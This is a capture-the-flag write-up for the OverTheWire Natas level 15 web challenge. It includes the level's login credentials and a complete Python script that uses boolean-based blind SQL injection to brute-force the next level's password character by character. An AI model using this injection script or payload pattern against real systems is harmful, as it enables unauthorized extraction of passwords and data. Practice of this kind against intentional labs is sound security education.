## Username
natas15

## Password
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

## Write-Up
<img width="591" height="355" alt="image" src="https://github.com/user-attachments/assets/2c8ff099-125b-4627-a472-58d55d4b8fb0" />  

This source code tells us whether the user that we submitted exists.(whether saved in database)  
In other words, we can get boolean, true or false response.  
In this situation, it is impossible to get a password in one try.  
We should script file that can get the password for brute-force way.  

```python
import requests #Easily HTTP Request
import string

#information to connect
url="http://natas15.natas.labs.overthewire.org/index.php"
username='natas15'
password='SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
auth=(username,password)

#Maintaining session
session=requests.Session()
session.auth=auth

final_password=""

#Making Alphabet + Numeric
charset=string.ascii_letters+string.digits

print('Start')

for i in range(1,33): #Password is 32 characters
    for char in charset:
        payload={'username': f'natas16" and substring(password,{i},1)=BINARY \'{char}\' -- -'}
        #BINARY: making case-sensitive

        #Sending data   
        res=session.post(url,data=payload)

        #Checking results
        if "This user exists." in res.text:
            final_password+=char
            print(final_password)
            break
            
print('End')
```

## Method of solve
Blind SQL Injection(Boolean-based)
